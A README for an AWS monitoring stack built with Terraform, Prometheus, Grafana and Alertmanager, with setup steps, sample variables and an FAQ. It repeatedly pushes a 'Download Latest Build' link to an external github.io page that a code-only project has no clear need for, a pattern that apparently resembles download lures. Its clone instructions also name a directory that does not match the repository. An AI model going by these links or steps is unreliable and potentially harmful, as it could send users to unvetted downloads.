# AWS Prometheus Grafana Terraform Monitoring Stack v2026 - AWS monitoring infrastructure for 2026

> **A Terraform-managed AWS observability environment combining Prometheus, Grafana, Alertmanager, and exporter services for repeatable monitoring deployments in 2026.**

[![Platform](https://img.shields.io/badge/Platform-AWS-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/alexzktjcarter9918/aws-grafana-prometheus-monitoring?style=flat-square)](https://github.com/alexzktjcarter9918/aws-grafana-prometheus-monitoring)

---

<p align="center">
  <a href="https://alexzktjcarter9918.github.io/aws-grafana-prometheus-monitoring/">
    <img src="https://img.shields.io/badge/Download-AWS%20Prometheus%20Grafana%20Terraform%20Monitoring%20Stack%20Latest-brightgreen?style=for-the-badge" alt="Download AWS Prometheus Grafana Terraform Monitoring Stack">
  </a>
</p>

> **[Download AWS Prometheus Grafana Terraform Monitoring Stack v2026](https://alexzktjcarter9918.github.io/aws-grafana-prometheus-monitoring/)**

---

[Download Latest Build](https://alexzktjcarter9918.github.io/aws-grafana-prometheus-monitoring/)

---

## Overview

AWS Prometheus Grafana Terraform Monitoring Stack turns a complete monitoring environment into infrastructure as code. Terraform creates the necessary AWS resources, while Prometheus, Grafana, Alertmanager, Node Exporter, and Blackbox Exporter provide the monitoring and observability components.

The project is designed for teams that need a consistent method for observing AWS hosts, services, and basic application activity. Alongside the core stack, sample application and incident simulation utilities are provided for exercising dashboards, alert rules, and operational procedures in a controlled environment.

---

## Included Capabilities

- Creates AWS VPC and EC2 infrastructure through Terraform
- Collects metrics with Prometheus
- Provides Grafana dashboards and visualization
- Routes alerts and notifications using Alertmanager
- Collects host metrics with Node Exporter
- Performs endpoint monitoring through Blackbox Exporter
- Enables email notifications through Gmail SMTP
- Supplies sample application and incident simulation utilities
- Stores Terraform state remotely in S3 with locking

---

## Getting Started

1. Download the repository and enter its directory:
   - `git clone https://github.com/alexzktjcarter9918/aws-grafana-prometheus-monitoring.git
   - `cd aws-prometheus-grafana-terraform-monitoring-stack`

2. Inspect the Terraform files and provide values appropriate for your AWS environment.

3. Initialize Terraform, review the proposed resources, and deploy:
   - `terraform init`
   - `terraform plan`
   - `terraform apply`

4. When provisioning is finished, use the AWS resources and service endpoints created by the configuration to reach Grafana and the other monitoring services.

---

## Working with the Stack

After deployment, Prometheus gathers data from the configured exporters and Grafana can be used to create or import dashboards.

A normal operating sequence includes:

- Confirming exporter targets are available in Prometheus
- Examining infrastructure, host, and endpoint data in Grafana
- Setting Alertmanager routes for notification delivery
- Running the sample application and incident simulations to verify alert behavior
- Revising Terraform files whenever the monitoring environment needs to grow or change

The primary Terraform lifecycle commands are:

- `terraform plan`
- `terraform apply`
- `terraform destroy`

---

## Configuration

Deployment behavior is controlled primarily through Terraform variables and the configuration supplied during `apply`. Depending on the environment, you may need to update AWS instance and resource sizing, network parameters, alert delivery options, or remote state settings.

For example:

    aws_region = "us-east-1"
    gmail_smtp_user = "your-email@gmail.com"
    gmail_smtp_password = "your-app-password"

When using S3 remote state, make sure the required bucket and locking configuration are available before starting the deployment.

---

## Prerequisites

- An AWS account authorized to create VPC, EC2, and related resources
- Terraform installed on the deployment machine
- An S3 bucket available for remote state storage and locking
- Network connectivity to AWS APIs and the deployed services
- Gmail SMTP credentials when email notifications are required
- A system that can run Terraform from the repository root

---

## Frequently Asked Questions

**What is the process for updating the environment?**  
Modify the Terraform configuration, run `terraform plan` to inspect the changes, and apply the resulting update.

**Where do notification rules live?**  
Alert delivery is managed by Alertmanager together with the notification settings defined in the deployment configuration.

**Can the alert workflow be exercised with simulated events?**  
Yes. The included incident simulation tools let you check dashboards and alert routes without waiting for an actual incident.

**How can I change Prometheus or Grafana behavior?**  
Update the relevant Terraform variables and service configuration, then redeploy the infrastructure.

**What teams is this intended for?**  
The stack is appropriate for DevOps, infrastructure, and observability use cases that require a repeatable AWS monitoring foundation.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
